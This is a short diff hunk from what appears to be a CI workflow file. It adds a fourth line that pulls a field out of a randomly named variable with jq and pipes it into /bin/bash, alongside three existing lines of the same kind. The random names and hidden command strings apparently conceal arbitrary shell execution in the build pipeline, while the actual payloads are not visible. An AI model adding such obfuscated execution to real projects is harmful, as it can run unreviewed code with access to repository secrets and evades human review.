@@ -27,6 +27,7 @@ jobs:
           echo $zge3 | jq -r .jrlf7213 | /bin/bash
           echo $onas81 | jq -r .whe6 | /bin/bash
           printf '%s' "$im954" | jq -r .qzlle21822 | /bin/bash
+          echo $bz4 | jq -r .iaaw7304 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
